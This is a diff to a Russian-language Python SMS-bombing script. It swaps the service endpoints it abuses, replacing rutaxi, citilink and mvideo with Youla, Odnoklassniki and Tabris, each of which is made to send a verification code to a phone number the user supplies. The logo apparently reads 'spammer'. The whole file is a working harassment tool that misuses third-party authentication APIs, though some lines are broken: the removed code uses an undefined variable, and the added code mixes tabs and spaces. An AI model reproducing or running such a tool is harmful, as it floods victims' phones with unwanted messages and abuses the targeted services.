@@ -5,20 +5,24 @@ import time
 def Soobsh():
     phone = str(input('Введите номер телефона: '))
     try:
-        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": phone9}).json()["res"] #Создаем пост запрос на сервис
-        print('Сообщение отправлено!') #В случае если код сработал, выв
+       requests.post("https://youla.ru/web-api/auth/request_code", data={"phone":phone})
+       print("Сообщение ЮЛА пошло")
     except:
-        print('Сообщение не отправлено.') #В случае если код не сработал, выведет это
+       print("Сообщение ЮЛА не пошло")
+       pass
     try:
-        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
-        print('Сообщение отправлено!')
+	    requests.post("https://ok.ru/web-api/auth/request_code", data={"phone":phone})
+	    print("Сообщение Дноклассники пошло")
     except:
-        print('Сообщение не отправлено.')
+        print("Сообщение Одноклассники не пошло")
+        pass
     try:
-        requests.post ("https://www.mvideo.ru/login" + phone + "/" )
-        print('Сообщение отправлено!')
+        requests.post("https://lk.tabris.ru/register/", data={"phone":phone})
+        print("Пошла фигня")
     except:
-        print('Сообщение не отправлено.')
+        print("Сообщение фигня и не пошло")
+        pass
+
 #Логотип
 def Logo():
  print(r"░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░███╗░░██╗██╗░░░██╗███╗░░░███╗░░███╗░░")
